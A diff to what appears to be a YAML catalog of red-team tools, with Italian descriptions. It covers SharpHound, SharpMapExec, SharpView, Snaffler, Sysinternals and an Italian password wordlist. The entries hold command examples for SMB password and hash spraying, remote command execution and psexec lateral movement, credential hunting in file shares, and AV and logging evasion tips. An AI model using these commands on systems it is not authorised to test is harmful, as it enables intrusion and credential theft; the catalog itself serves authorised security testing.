-    (CIS, DISA STIG).<br><strong>Post-incident forensics:</strong> Raccolta configurazioni.<br><strong>Golden
-    image validation:</strong> Verifica standard security pre-deployment.</p><br><hr><h4 class=\"\
-    rt-red\">Analisi output</h4><p>Richiede interpretazione analyst: confrontare User
-    Rights con least privilege, verificare audit policy, identificare software obsoleto,
-    validare network hardening.</p><br><hr>"
+  desc: "Script PowerShell per raccolta baseline sicurezza host Windows (GPO, policy, servizi, patch) con output strutturato per audit e hardening"
+  desc_long: "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>SecurityAssessment.ps1</strong> raccoglie baseline di sicurezza host Windows esportando configurazioni, policy effettive e inventory sistema in formato strutturato. Solo lettura passiva, nessuna modifica.</p><br><hr><h4 class=\"rt-purple\">Dati raccolti</h4><p><strong>Group Policy:</strong> gpresult /h con policy applicate.</p><p><strong>Security Policy:</strong> secedit export, auditpol, User Rights Assignment.</p><p><strong>Network config:</strong> SMB versions/signing, NTLM settings, firewall rules.</p><p><strong>System inventory:</strong> Software, patch level, servizi, scheduled tasks, processi.</p><p><strong>Security features:</strong> Defender status, AppLocker, BitLocker, UAC.</p><br><hr><h4 class=\"rt-green\">Esecuzione</h4><p><strong>Prerequisiti:</strong> PowerShell elevated</p><p><strong>Basic:</strong> <code>PS> .\\SecurityAssessment.ps1</code></p><p><strong>Custom output:</strong> <code>PS> .\\SecurityAssessment.ps1 -OutputPath C:\\Assessments</code></p><p>Output: ZIP con report, HTML summary dashboard, log timestamp.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p><strong>Pre-hardening baseline:</strong> Stato prima di security baselines.</p><p><strong>Compliance verification:</strong> Confronto con benchmarks (CIS, DISA STIG).</p><p><strong>Post-incident forensics:</strong> Raccolta configurazioni.</p><p><strong>Golden image validation:</strong> Verifica standard security pre-deployment.</p><br><hr><h4 class=\"rt-red\">Analisi output</h4><p>Richiede interpretazione analyst: confrontare User Rights con least privilege, verificare audit policy, identificare software obsoleto, validare network hardening.</p><br><hr>"
   best_in: false
-  category_path: ["00_Common", "Tools_Windows"]
+  category_path: [ "00_Common", "Tools_Windows" ]
   notes:
 
 - id: "sharphound"
   name: "SharpHound.exe"
   version: ""
   icon: "../app/icons/github.svg"
-  kind: "windows"
-  phases: ["00_Common"]
-  caps: ["ad-graph-collection", "bloodhound-ingest"]
+  installation: "GitHub"
   repo: "https://github.com/SpecterOps/SharpHound"
-  desc: "Data collector ufficiale per BloodHound che raccoglie relazioni AD (ACL,
-    sessioni, gruppi, trust) generando dataset per analisi attack path"
-  desc_long: "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>SharpHound</strong>
-    è il collector C# ufficiale per BloodHound, progettato per mappare relazioni e
-    permessi AD tramite query LDAP, API rete e interrogazioni host. Produce JSON/ZIP
-    importabili in BloodHound per visualizzazione grafica attack paths.</p><br><hr><h4 class=\"\
-    rt-purple\">Collection Methods</h4><p>Selezionabili con <code>-c</code>:</p><ul><li><strong>Default</strong>
-    - Bilanciato per maggior parte scenari</li><li><strong>All</strong> - Completa
-    (rumorosa e lenta)</li><li><strong>DCOnly</strong> - Solo da DC (no host interrogation)</li><li><strong>Session</strong>
-    - Solo sessioni logged on</li><li><strong>LoggedOn</strong> - Utenti via NetSessionEnum/Registry</li><li><strong>Group</strong>
-    - Solo membership gruppi</li><li><strong>LocalAdmin</strong> - Local administrators
-    su computer</li><li><strong>GPOLocalGroup</strong> - Local admin grants via GPO</li><li><strong>Trusts</strong>
-    - Trust relationships</li><li><strong>ACL</strong> - Access Control Lists</li><li><strong>RDP,
-    DCOM, PSRemote</strong> - Remote access rights</li></ul></p><br><hr><h4 class=\"rt-green\"\
-    >Esempi</h4><p><strong>Standard:</strong> <code>SharpHound.exe -c All</code><br><strong>Stealth
-    DC-only:</strong> <code>SharpHound.exe -c DCOnly</code><br><strong>Loop sessioni:</strong>
-    <code>SharpHound.exe -c Session --Loop --LoopDuration 02:00:00</code><br><strong>Con
-    throttling:</strong> <code>SharpHound.exe -c All --Throttle 1000 --Jitter 20</code></p><br><hr><h4
-    class=\"rt-amber\">Output</h4><p>ZIP con JSON: computers.json, users.json, groups.json,
-    domains.json, gpos.json, ous.json. Import in BloodHound via drag-and-drop.</p><br><hr><h4
-    class=\"rt-red\">OPSEC</h4><p>Session/LoggedOn interrogano tutti computer via
-    SMB (traffico massivo, failed connections). Query LDAP massive impattano DC. SOC
-    rileva: pattern query tipici SharpHound, connessioni SMB fallite massive, accesso
-    attributi sensibili. Best practice: DCOnly per stealth, All su scope limitato,
-    throttling, pianificare finestre manutenzione.</p><br><hr>"
+  desc: "Data collector ufficiale per BloodHound che raccoglie relazioni AD (ACL, sessioni, gruppi, trust) generando dataset per analisi attack path"
+  desc_long: "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>SharpHound</strong> è il collector C# ufficiale per BloodHound, progettato per mappare relazioni e permessi Active Directory tramite query LDAP, API di rete e interrogazioni host. Produce file JSON/ZIP importabili in BloodHound per visualizzazione grafica degli attack path.</p><br><hr><h4 class=\"rt-purple\">Metodi di Collection</h4><p>Selezionabili con <code>-c</code>:</p><ul><li><strong>Default</strong> - Bilanciato per la maggior parte degli scenari</li><li><strong>All</strong> - Completa (rumorosa e lenta)</li><li><strong>DCOnly</strong> - Solo da DC (senza interrogazione host)</li><li><strong>Session</strong> - Solo sessioni logged on</li><li><strong>LoggedOn</strong> - Utenti via NetSessionEnum/Registry</li><li><strong>Group</strong> - Solo membership gruppi</li><li><strong>LocalAdmin</strong> - Local administrators sui computer</li><li><strong>GPOLocalGroup</strong> - Local admin grants via GPO</li><li><strong>Trusts</strong> - Trust relationships</li><li><strong>ACL</strong> - Access Control Lists</li><li><strong>RDP, DCOM, PSRemote</strong> - Remote access rights</li></ul><br><hr><h4 class=\"rt-green\">Esempi di Utilizzo</h4><p><strong>Standard:</strong> <code>SharpHound.exe -c All</code><br><strong>Stealth DC-only:</strong> <code>SharpHound.exe -c DCOnly</code><br><strong>Loop sessioni:</strong> <code>SharpHound.exe -c Session --Loop --LoopDuration 02:00:00</code><br><strong>Con throttling:</strong> <code>SharpHound.exe -c All --Throttle 1000 --Jitter 20</code></p><br><hr><h4 class=\"rt-amber\">Output</h4><p>Genera file ZIP contenenti JSON: computers.json, users.json, groups.json, domains.json, gpos.json, ous.json. Importare in BloodHound tramite drag-and-drop.</p><br><hr><h4 class=\"rt-red\">OPSEC</h4><p>Session/LoggedOn interrogano tutti i computer via SMB (traffico massivo, connessioni fallite). Le query LDAP massive impattano il DC. I SOC rilevano: pattern di query tipici di SharpHound, connessioni SMB fallite massive, accesso ad attributi sensibili. Best practice: DCOnly per stealth, All su scope limitato, throttling, pianificare finestre di manutenzione.</p><br><hr>"
   best_in: false
-  category_path: ["00_Common", "Tools_Windows"]
+  category_path: [ "00_Common", "Tools_Windows" ]
   notes:
 
 - id: "sharpmapexec"
   name: "SharpMapExec.exe"
   version: ""
   icon: "../app/icons/github.svg"
-  kind: "windows"
-  phases: ["00_Common"]
-  caps: ["lateral-movement", "spray", "remote-exec"]
+  installation: "GitHub"
   repo: "https://github.com/cube0x0/SharpMapExec"
-  desc: "Reimplementazione C# di CrackMapExec per lateral movement e remote execution
-    da Windows senza dipendenze Python"
-  desc_long: "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>SharpMapExec</strong>
-    è reimplementazione C# di CrackMapExec core capabilities, permettendo credential
-    validation, enumeration e command execution su host remoti Windows da ambiente
-    .NET senza Python.</p><br><hr><h4 class=\"rt-purple\">Funzionalità</h4><p><strong>Protocol:</strong>
-    SMB, WMI, WinRM per auth/execution.<br><strong>Credential testing:</strong> Password,
-    NTLM hash, Kerberos ticket per spray su multiple target.<br><strong>Enumeration:</strong>
-    Shares SMB/ACL, local admins, sessioni attive, system info.<br><strong>Execution:</strong>
-    WMI commands, SMB via service, WinRM PowerShell remoting.</p><br><hr><h4 class=\"rt-green\"\
-    >Utilizzo</h4><p><strong>SMB spray:</strong></p><pre><code>SharpMapExec.exe smb
-    /targets:hosts.txt /user:admin /password:pass</code></pre><p><strong>Con hash:</strong></p><pre><code>SharpMapExec.exe
-    smb /targets:192.168.1.0/24 /user:admin /ntlm:hash</code></pre><p><strong>Command
-    exec:</strong></p><pre><code>SharpMapExec.exe smb /targets:target.txt /user:admin
-    /password:pass /command:\"whoami\"</code></pre><br><hr><h4 class=\"rt-amber\">Vantaggi
-    vs CME</h4><p>Esecuzione nativa .NET senza Python, più difficile rilevare per
-    signature AV, integrazione C2 .NET, compile-time obfuscation possibile.</p><br><hr><h4
-    class=\"rt-red\">OPSEC</h4><p>Stesso footprint network di CME: auth massive generano
-    4624/4625 su tutti host. Throttling, targeting selettivo, monitor account lockout
-    necessari.</p><br><hr>"
+  desc: "Reimplementazione C# di CrackMapExec per lateral movement e remote execution da Windows senza dipendenze Python"
+  desc_long: "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>SharpMapExec</strong> è una reimplementazione C# delle core capabilities di CrackMapExec, permettendo credential validation, enumeration e command execution su host remoti Windows da ambiente .NET senza Python.</p><br><hr><h4 class=\"rt-purple\">Funzionalità</h4><p><strong>Protocolli:</strong> SMB, WMI, WinRM per autenticazione/esecuzione.<br><strong>Credential testing:</strong> Password, hash NTLM, ticket Kerberos per spray su target multipli.<br><strong>Enumeration:</strong> Share SMB/ACL, local admins, sessioni attive, informazioni di sistema.<br><strong>Execution:</strong> Comandi WMI, SMB via service, WinRM PowerShell remoting.</p><br><hr><h4 class=\"rt-green\">Esempi di Utilizzo</h4><p><strong>SMB spray:</strong></p><pre><code>SharpMapExec.exe smb /targets:hosts.txt /user:admin /password:pass</code></pre><p><strong>Con hash:</strong></p><pre><code>SharpMapExec.exe smb /targets:192.168.1.0/24 /user:admin /ntlm:hash</code></pre><p><strong>Command exec:</strong></p><pre><code>SharpMapExec.exe smb /targets:target.txt /user:admin /password:pass /command:'whoami'</code></pre><br><hr><h4 class=\"rt-amber\">Vantaggi vs CME</h4><p>Esecuzione nativa .NET senza Python, più difficile da rilevare per le signature AV, integrazione con C2 .NET, possibile obfuscation a compile-time.</p><br><hr><h4 class=\"rt-red\">OPSEC</h4><p>Stesso footprint di rete di CME: autenticazioni massive generano eventi 4624/4625 su tutti gli host. Necessari throttling, targeting selettivo e monitoraggio dell'account lockout.</p><br><hr>"
   best_in: false
-  category_path: ["00_Common", "Tools_Windows"]
+  category_path: [ "00_Common", "Tools_Windows" ]
   notes:
 
 - id: "sharpview"
   name: "SharpView.exe"
   version: ""
   icon: "../app/icons/github.svg"
-  kind: "windows"
-  phases: ["00_Common"]
-  caps: ["ad-enum", "acl-enum", "situational-awareness"]
+  installation: "GitHub"
   repo: "https://github.com/tevora-threat/SharpView"
-  desc: "Port C# di PowerView per enumerazione AD quando PowerShell è ristretto, con
-    funzionalità di ACL analysis e situational awareness"
-  desc_long: "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>SharpView</strong> è
-    port C# di PowerView per scenari con PowerShell ristretto da Constrained Language
-    Mode, AppLocker o monitoring aggressivo. Compila in eseguibile standalone senza
-    dipendenze script.</p><br><hr><h4 class=\"rt-purple\">Funzioni da PowerView</h4><p><strong>User
-    enum:</strong> Get-DomainUser con filtri AdminCount, SPN, attributi custom.<br><strong>Group
-    enum:</strong> Get-DomainGroup, Get-DomainGroupMember ricorsivo.<br><strong>Computer
-    enum:</strong> Get-DomainComputer con filtri OS/service pack.<br><strong>ACL analysis:</strong>
-    Get-ObjectAcl per permessi exploitable.<br><strong>Trust mapping:</strong> Get-DomainTrust
-    inter-domain.<br><strong>GPO enum:</strong> Get-DomainGPO e relazioni OU.</p><br><hr><h4
-    class=\"rt-green\">Utilizzo</h4><p><strong>Utenti privilegiati:</strong></p><pre><code>SharpView.exe
-    Get-DomainUser -AdminCount</code></pre><p><strong>Unconstrained delegation:</strong></p><pre><code>SharpView.exe
-    Get-DomainComputer -Unconstrained</code></pre><p><strong>ACL oggetto:</strong></p><pre><code>SharpView.exe
-    Get-ObjectAcl -SamAccountName \"Domain Admins\" -ResolveGUIDs</code></pre><br><hr><h4
-    class=\"rt-amber\">Integration</h4><p>Usato per raccolta dati preliminare a BloodHound.
-    Output parsabile e convertibile in formato ingest BloodHound con script custom.</p><br><hr><h4
-    class=\"rt-red\">Evasion</h4><p>Vantaggi: no PowerShell dependency (evita script
-    block logging), offuscazione compile-time, in-memory execution via execute-assembly.
-    Limitazioni: binary firmato whitelistable, stesso traffico LDAP PowerView, meno
-    feature-complete.</p><br><hr>"
+  desc: "Port C# di PowerView per enumerazione AD quando PowerShell è ristretto, con funzionalità di ACL analysis e situational awareness"
+  desc_long: "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>SharpView</strong> è un port C# di PowerView per scenari con PowerShell ristretto da Constrained Language Mode, AppLocker o monitoraggio aggressivo. Compila in eseguibile standalone senza dipendenze da script.</p><br><hr><h4 class=\"rt-purple\">Funzioni da PowerView</h4><p><strong>User enum:</strong> Get-DomainUser con filtri AdminCount, SPN, attributi custom.<br><strong>Group enum:</strong> Get-DomainGroup, Get-DomainGroupMember ricorsivo.<br><strong>Computer enum:</strong> Get-DomainComputer con filtri OS/service pack.<br><strong>ACL analysis:</strong> Get-ObjectAcl per permessi exploitable.<br><strong>Trust mapping:</strong> Get-DomainTrust inter-domain.<br><strong>GPO enum:</strong> Get-DomainGPO e relazioni OU.</p><br><hr><h4 class=\"rt-green\">Esempi di Utilizzo</h4><p><strong>Utenti privilegiati:</strong></p><pre><code>SharpView.exe Get-DomainUser -AdminCount</code></pre><p><strong>Unconstrained delegation:</strong></p><pre><code>SharpView.exe Get-DomainComputer -Unconstrained</code></pre><p><strong>ACL oggetto:</strong></p><pre><code>SharpView.exe Get-ObjectAcl -SamAccountName 'Domain Admins' -ResolveGUIDs</code></pre><br><hr><h4 class=\"rt-amber\">Integrazione</h4><p>Usato per raccolta dati preliminare a BloodHound. L'output è parsabile e convertibile in formato ingest BloodHound con script custom.</p><br><hr><h4 class=\"rt-red\">Evasion</h4><p>Vantaggi: nessuna dipendenza PowerShell (evita script block logging), obfuscation a compile-time, esecuzione in-memory via execute-assembly. Limitazioni: binario firmato whitelistable, stesso traffico LDAP di PowerView, meno feature-complete.</p><br><hr>"
   best_in: false
-  category_path: ["00_Common", "Tools_Windows"]
+  category_path: [ "00_Common", "Tools_Windows" ]
   notes:
 
 - id: "snaffler"
   name: "Snaffler.exe"
   version: ""
   icon: "../app/icons/github.svg"
-  kind: "windows"
-  phases: ["00_Common"]
-  caps: ["fileshare-hunting", "secret-discovery", "regex-content"]
+  installation: "GitHub"
   repo: "https://github.com/SnaffCon/Snaffler"
-  desc: "Scanner di file share Windows per individuare credenziali e dati sensibili
-    tramite pattern matching e regex content analysis"
-  desc_long: "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Snaffler</strong> è
-    tool content discovery per file share Windows che scansiona SMB shares cercando
-    informazioni sensibili: credenziali, chiavi API, configurazioni, PII. Usa pattern
-    matching intelligente e regex per trovare 'needles in haystack'.</p><br><hr><h4 class=\"\
-    rt-purple\">Classificazione finding</h4><p><strong>Black</strong> - Massima gravità
-    (password, chiavi private, DB connection strings)<br><strong>Red</strong> - Alta
-    gravità (config files, scripts con creds)<br><strong>Yellow</strong> - Media gravità
-    (interessanti non immediately critical)<br><strong>Green</strong> - Bassa gravità
-    (potentially interesting, high false positive)</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p><strong>Scan
-    dominio:</strong> <code>Snaffler.exe -s -o snaffler.log</code><br><strong>Target
-    specifico:</strong> <code>Snaffler.exe -n -s -o results.log -i C:\\,\\\\server\\
-    share</code><br><strong>Solo severity alta:</strong> <code>Snaffler.exe -s -o
-    critical.log -r Black</code><br><strong>Regex custom:</strong> <code>Snaffler.exe
-    -s -o output.log -m \"(password|credential)\"</code></p><br><hr><h4 class=\"rt-amber\"\
-    >Pattern detection</h4><p>Cerca: file extensions (.kdbx, .ppk, .key, .pem, .pfx,
-    .rdp), nome file patterns (password, backup, secret), content regex (connection
-    strings, API keys, private keys), config files (web.config, .env, appsettings.json).
-    Pattern personalizzabili via rule files.</p><br><hr><h4 class=\"rt-red\">Considerazioni</h4><p>Performance:
-    su share grandi richiede ore e traffico SMB significativo. Usare <code>-t</code>
-    threading control, <code>-m</code> per scope filtering. Trova solo file accessibili
-    con credenziali correnti. SMB enum massiva rilevabile: timing fuori orario, throttling,
-    coordination blue team. Log contiene path sensibili: proteggere appropriatamente.</p><br><hr>"
+  desc: "Scanner di file share Windows per individuare credenziali e dati sensibili tramite pattern matching e regex content analysis"
+  desc_long: "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Snaffler</strong> è un tool di content discovery per file share Windows che scansiona share SMB cercando informazioni sensibili: credenziali, chiavi API, configurazioni, PII. Usa pattern matching intelligente e regex per trovare 'needles in haystack'.</p><br><hr><h4 class=\"rt-purple\">Classificazione Finding</h4><p><strong>Black</strong> - Massima gravità (password, chiavi private, DB connection strings)<br><strong>Red</strong> - Alta gravità (config files, script con credenziali)<br><strong>Yellow</strong> - Media gravità (interessanti ma non immediatamente critici)<br><strong>Green</strong> - Bassa gravità (potenzialmente interessanti, alto tasso di falsi positivi)</p><br><hr><h4 class=\"rt-green\">Esempi di Utilizzo</h4><p><strong>Scan dominio:</strong> <code>Snaffler.exe -s -o snaffler.log</code><br><strong>Target specifico:</strong> <code>Snaffler.exe -n -s -o results.log -i C:\\,\\\\server\\share</code><br><strong>Solo severity alta:</strong> <code>Snaffler.exe -s -o critical.log -r Black</code><br><strong>Regex custom:</strong> <code>Snaffler.exe -s -o output.log -m '(password|credential)'</code></p><br><hr><h4 class=\"rt-amber\">Pattern Detection</h4><p>Cerca: estensioni file (.kdbx, .ppk, .key, .pem, .pfx, .rdp), pattern nei nomi file (password, backup, secret), content regex (connection strings, API keys, chiavi private), config files (web.config, .env, appsettings.json). Pattern personalizzabili via rule files.</p><br><hr><h4 class=\"rt-red\">Considerazioni</h4><p>Performance: su share grandi richiede ore e traffico SMB significativo. Usare <code>-t</code> per thread control, <code>-m</code> per scope filtering. Trova solo file accessibili con credenziali correnti. L'enumerazione SMB massiva è rilevabile: preferire timing fuori orario, throttling, coordinamento con il blue team. I log contengono path sensibili: proteggerli appropriatamente.</p><br><hr>"
   best_in: false
-  category_path: ["00_Common", "Tools_Windows"]
+  category_path: [ "00_Common", "Tools_Windows" ]
   notes:
 
 - id: "sysinternals-suite"
   name: "SysinternalsSuite"
   version: ""
   icon: "../app/icons/github.svg"
-  kind: "windows"
-  phases: ["00_Common"]
-  caps: ["proc-monitoring", "forensics", "troubleshooting"]
+  installation: "GitHub"
   repo: "https://learn.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite"
-  desc: "Raccolta Microsoft di utility per analisi processi, servizi, registry e rete
-    (Autoruns, ProcMon, Sysmon, PsTools) per troubleshooting e DFIR"
-  desc_long: "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Sysinternals Suite</strong>
-    è collezione Microsoft di utility per amministrazione avanzata, troubleshooting
-    e forensics Windows. Include 70+ tool per analisi processi, filesystem, registry,
-    networking, security, essenziali per incident response e pentest.</p><br><hr><h4 class=\"\
-    rt-purple\">Tool principali</h4><p><strong>Autoruns:</strong> Visualizza programmi
-    autostart (registry, startup folder, scheduled tasks, services, drivers). Essenziale
-    per persistence analysis e malware detection.</p><p><strong>Process Monitor:</strong>
-    Real-time monitoring filesystem, registry, process/thread, network. Fondamentale
-    per reverse engineering e troubleshooting.</p><p><strong>Process Explorer:</strong>
-    Task manager avanzato con dependency view, handle inspection, DLL listing, performance
-    metrics.</p><p><strong>Sysmon:</strong> System Monitor che logga eventi dettagliati
-    (process creation, network connections, file creation) su Event Log per SIEM ingestion
-    e threat hunting.</p><p><strong>PsTools:</strong> Command-line tools administration
-    remota: PsExec (remote command), PsList (process listing), PsKill (terminate processi),
-    PsLoggedOn (logged on users), PsInfo (system info).</p><p><strong>TCPView:</strong>
-    Real-time monitoring connessioni TCP/UDP con risoluzione endpoint e process mapping.</p><p><strong>AccessChk:</strong>
-    Verifica access rights su files, registry, services, processes.</p><p><strong>Strings:</strong>
-    Estrae stringhe ASCII/Unicode da binari per quick analysis eseguibili sospetti.</p><br><hr><h4
-    class=\"rt-green\">Utilizzo in pentest</h4><p><strong>Post-exploitation recon:</strong></p><pre><code>psinfo.exe
-    \\\\target</code> - System info<br><code>psloggedon.exe \\\\target</code> - Logged
-    on users</p><p><strong>Lateral movement:</strong><br><code>psexec.exe \\\\target
-    -u admin -p pass cmd.exe</code></pre><p><strong>Persistence check:</strong> Autoruns
-    per enum autostart locations e validare artifacts.</p><p><strong>Process analysis:</strong>
-    Process Explorer per identificare injection, hollowing, evasion techniques.</p><p><strong>Network
-    monitoring:</strong> TCPView per detection C2 callbacks o data exfiltration.</p><br><hr><h4
-    class=\"rt-amber\">Sysmon per detection</h4><p><strong>Installazione:</strong></p><pre><code>sysmon64.exe
-    -accepteula -i sysmonconfig.xml</code></pre><p>Eventi chiave:</p><ul><li>Event
-    ID 1 - Process creation con command line</li><li>Event ID 3 - Network connections</li><li>Event
-    ID 7 - Image loaded (DLL)</li><li>Event ID 10 - Process access (credential dumping
-    detection)</li><li>Event ID 11 - File creation</li></ul><p>Config SwiftOnSecurity's
-    sysmon-config è baseline standard.</p><br><hr><h4 class=\"rt-red\">Considerazioni</h4><p><strong>PsExec
-    detection:</strong> Crea service temporaneo PSEXESVC rilevabile da EDR, genera
-    eventi 4697 (service installed), lascia artifacts in C:\\Windows\\.</p><p><strong>ProcMon
-    performance:</strong> Può generare GB di log rapidamente, usare filtri aggressivi.</p><p><strong>Licensing:</strong>
-    Gratuiti ma richiedono EULA acceptance, usare <code>-accepteula</code> per automation.</p><br><hr>"
+  desc: "Raccolta Microsoft di utility per analisi processi, servizi, registry e rete (Autoruns, ProcMon, Sysmon, PsTools) per troubleshooting e DFIR"
+  desc_long: "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Sysinternals Suite</strong> è una collezione Microsoft di utility per amministrazione avanzata, troubleshooting e forensics Windows. Include oltre 70 tool per analisi processi, filesystem, registry, networking e security, essenziali per incident response e pentest.</p><br><hr><h4 class=\"rt-purple\">Tool Principali</h4><p><strong>Autoruns:</strong> Visualizza programmi in autostart (registry, startup folder, scheduled tasks, services, drivers). Essenziale per persistence analysis e malware detection.</p><p><strong>Process Monitor:</strong> Real-time monitoring di filesystem, registry, process/thread, network. Fondamentale per reverse engineering e troubleshooting.</p><p><strong>Process Explorer:</strong> Task manager avanzato con dependency view, handle inspection, DLL listing, metriche di performance.</p><p><strong>Sysmon:</strong> System Monitor che logga eventi dettagliati (creazione processi, connessioni di rete, creazione file) su Event Log per ingest SIEM e threat hunting.</p><p><strong>PsTools:</strong> Tool da command-line per amministrazione remota: PsExec (remote command), PsList (process listing), PsKill (terminazione processi), PsLoggedOn (utenti loggati), PsInfo (info di sistema).</p><p><strong>TCPView:</strong> Real-time monitoring connessioni TCP/UDP con risoluzione endpoint e process mapping.</p><p><strong>AccessChk:</strong> Verifica access rights su file, registry, servizi, processi.</p><p><strong>Strings:</strong> Estrae stringhe ASCII/Unicode da binari per quick analysis di eseguibili sospetti.</p><br><hr><h4 class=\"rt-green\">Utilizzo in Pentest</h4><p><strong>Post-exploitation recon:</strong></p><pre><code>psinfo.exe \\\\target</code> - Info di sistema<br><code>psloggedon.exe \\\\target</code> - Utenti loggati</p><p><strong>Lateral movement:</strong><br><code>psexec.exe \\\\target -u admin -p pass cmd.exe</code></pre><p><strong>Persistence check:</strong> Autoruns per enumerare autostart locations e validare artifacts.</p><p><strong>Process analysis:</strong> Process Explorer per identificare injection, hollowing, evasion techniques.</p><p><strong>Network monitoring:</strong> TCPView per rilevare C2 callback o data exfiltration.</p><br><hr><h4 class=\"rt-amber\">Sysmon per Detection</h4><p><strong>Installazione:</strong></p><pre><code>sysmon64.exe -accepteula -i sysmonconfig.xml</code></pre><p>Eventi chiave:</p><ul><li>Event ID 1 - Creazione processi con command line</li><li>Event ID 3 - Connessioni di rete</li><li>Event ID 7 - Image loaded (DLL)</li><li>Event ID 10 - Process access (rilevamento credential dumping)</li><li>Event ID 11 - Creazione file</li></ul><p>La config SwiftOnSecurity's sysmon-config è una baseline standard.</p><br><hr><h4 class=\"rt-red\">Considerazioni</h4><p><strong>PsExec detection:</strong> Crea un servizio temporaneo PSEXESVC rilevabile da EDR, genera eventi 4697 (servizio installato), lascia artifacts in C:\\Windows\\.</p><p><strong>ProcMon performance:</strong> Può generare GB di log rapidamente, usare filtri aggressivi.</p><p><strong>Licensing:</strong> Gratuiti ma richiedono accettazione EULA, usare <code>-accepteula</code> per automazione.</p><br><hr>"
   best_in: false
-  category_path: ["00_Common", "Tools_Windows"]
+  category_path: [ "00_Common", "Tools_Windows" ]
   notes:
 
 - id: "wordlist-paroleitaliane"
   name: "Parole Italiane"
   version: ""
   icon: "../app/icons/github.svg"
-  kind: "wordlist"
-  phases: ["00_Common"]
-  caps: ["italian-words", "mutation-base"]
+  installation: "GitHub"
   repo: "https://github.com/napolux/paroleitaliane"
-  desc: "Dizionari italiani (nomi, cognomi, termini comuni) per password spraying
-    e wordlist generation contestuale su target locali"
-  desc_long: "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Parole Italiane</strong>
-    è collezione dizionari lingua italiana ottimizzata per security testing su organizzazioni
-    italiane. Include liste nomi propri, cognomi, città, termini comuni e pattern
-    linguistici per generazione wordlist contestuali.</p><br><hr><h4 class=\"rt-purple\">Contenuto</h4><p><strong>Nomi
-    e cognomi:</strong> Database nomi italiani maschili/femminili e cognomi diffusi
-    per username enumeration e generazione credenziali realistiche.</p><p><strong>Termini
-    comuni:</strong> Parole quotidiane frequenti in password italiane (stagioni, mesi,
-    città, squadre calcio).</p><p><strong>Pattern linguistici:</strong> Combinazioni
-    tipiche italiane per mutation rules (suffissi, prefissi, sostituzioni carattere).</p><br><hr><h4
-    class=\"rt-green\">Casi d'uso</h4><p><strong>Password spraying:</strong> Generare
-    wordlist probabili basate su cultura italiana: Roma2025!, Juventus123, Estate2024,
-    Milano@2025</p><p><strong>Username enumeration:</strong> Combinare nomi/cognomi
-    per username realistici: mario.rossi, m.rossi, rossi.mario, mrossi</p><p><strong>Mutation
-    base:</strong> Usare parole italiane come base per rule-based mutations:<br><code>hashcat
-    --stdout wordlist-ita.txt -r best64.rule</code></p><br><hr><h4 class=\"rt-amber\">Integration
-    con tool</h4><p><strong>CeWL custom wordlist:</strong></p><pre><code>cewl -d 2
-    -m 5 --with-numbers -w custom-ita.txt https://target.it</code><br>Merge con parole
-    italiane base.</p><p><strong>Username-anarchy:</strong><br><code>username-anarchy
-    --input-file nominativi-ita.txt --select-format first.last > users.txt</code></pre><p><strong>Mentalist:</strong>
-    Usare parole italiane in chain con anni, simboli, numeri comuni.</p><br><hr><h4 class=\"\
-    rt-red\">Best practice</h4><p>Combinare con OSINT target-specific (social media,
-    LinkedIn), aggiungere pattern aziendali (nome_compagnia, slogan), includere varianti
-    ortografiche e typo, testare suffissi numerici/simboli mandatori da policy. Liste
-    curate per contesto specifico più efficaci di migliaia generiche: 50-200 password
-    altamente probabili ottimali per spraying.</p><br><hr>"
+  desc: "Dizionari italiani (nomi, cognomi, termini comuni) per password spraying e wordlist generation contestuale su target locali"
+  desc_long: "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Parole Italiane</strong> è una collezione di dizionari in lingua italiana ottimizzata per security testing su organizzazioni italiane. Include liste di nomi propri, cognomi, città, termini comuni e pattern linguistici per generazione di wordlist contestuali.</p><br><hr><h4 class=\"rt-purple\">Contenuto</h4><p><strong>Nomi e cognomi:</strong> Database di nomi italiani maschili/femminili e cognomi diffusi per username enumeration e generazione di credenziali realistiche.</p><p><strong>Termini comuni:</strong> Parole quotidiane frequenti nelle password italiane (stagioni, mesi, città, squadre di calcio).</p><p><strong>Pattern linguistici:</strong> Combinazioni tipiche italiane per mutation rules (suffissi, prefissi, sostituzioni di caratteri).</p><br><hr><h4 class=\"rt-green\">Casi d'Uso</h4><p><strong>Password spraying:</strong> Generare wordlist probabili basate sulla cultura italiana: Roma2025!, Juventus123, Estate2024, Milano@2025</p><p><strong>Username enumeration:</strong> Combinare nomi/cognomi per username realistici: mario.rossi, m.rossi, rossi.mario, mrossi</p><p><strong>Mutation base:</strong> Usare parole italiane come base per rule-based mutations:<br><code>hashcat --stdout wordlist-ita.txt -r best64.rule</code></p><br><hr><h4 class=\"rt-amber\">Integration con Tool</h4><p><strong>CeWL custom wordlist:</strong></p><pre><code>cewl -d 2 -m 5 --with-numbers -w custom-ita.txt https://target.it</code><br>Merge con parole italiane base.</p><p><strong>Username-anarchy:</strong><br><code>username-anarchy --input-file nominativi-ita.txt --select-format first.last > users.txt</code></pre><p><strong>Mentalist:</strong> Usare parole italiane in chain con anni, simboli, numeri comuni.</p><br><hr><h4 class=\"rt-red\">Best Practice</h4><p>Combinare con OSINT target-specific (social media, LinkedIn), aggiungere pattern aziendali (nome_compagnia, slogan), includere varianti ortografiche e typo, testare suffissi numerici/simboli mandatori da policy. Liste curate per contesto specifico sono più efficaci di migliaia generiche: 50-200 password altamente probabili sono ottimali per spraying.</p><br><hr>"
   best_in: false
-  category_path: ["00_Common", "Wordlists"]
+  category_path: [ "00_Common", "Wordlists" ]
   notes:
 
 - id: "wordlist-payloadsallthethings-4-2"
   name: "PayloadsAllTheThings"
   version: "4.2"
   icon: "../app/icons/github.svg"
-  kind: "wordlist"
-  phases: ["00_Common"]
-  caps: ["payloads", "fuzzing", "bypass-techniques"]
+  installation: "GitHub"
   repo: "https://github.com/swisskyrepo/PayloadsAllTheThings"
